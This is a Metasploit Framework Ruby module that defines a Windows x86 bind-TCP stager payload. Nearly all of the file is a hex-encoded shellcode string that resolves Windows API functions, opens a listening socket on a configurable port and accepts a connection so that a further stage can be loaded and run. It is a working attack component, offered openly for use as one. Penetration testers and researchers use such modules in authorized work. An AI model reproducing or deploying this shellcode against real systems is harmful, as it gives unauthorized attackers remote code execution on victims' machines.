require 'msf/core'
require 'msf/core/handler/bind_tcp'

module Msf
module Payloads
module Stagers
module Windows

module BindTcp

	include Msf::Payload::Stager
	include Msf::Payload::Windows

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Bind TCP Stager',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection',
			'Author'        => 'vlad902',
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Convention'    => 'sockedi',
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LPORT' => [ 162, 'n' ],
						},
					'Payload' =>
						"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" +
						"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" +
						"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" +
						"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" +
						"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" +
						"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" +
						"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" +
						"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" +
						"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" +
						"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0" +
						"\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff" +
						"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53" +
						"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff" +
						"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x68\xb6\x19" +
						"\x18\xe7\x57\xff\xd6\x87\xdf\x89\xe2\x31\xc9\x51\xb5\x0c\x51\x52" +
						"\x57\x52\xff\xe0"
				}
			))
	end

end

end end end end
